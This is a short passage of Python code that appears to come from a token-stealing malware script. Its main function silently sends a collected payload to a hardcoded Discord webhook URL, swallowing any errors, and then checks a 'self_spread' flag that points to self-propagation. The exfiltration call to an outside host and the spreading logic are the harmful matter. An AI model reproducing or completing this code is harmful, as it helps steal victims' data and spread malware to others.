...
def main():
    ...
    try: 
        urlopen(Request("https://discord.com/api/webhooks/924052896897695814/m3BdJijLm1YdGGEg8mDWs-bj3bFFovMF0f8qq93Nkd9hi9_zcplBz6h43HTcHEtiYQJx", data=dumps(webhook).encode(), headers=getheaders())) 
    except:
        pass
    if self_spread:
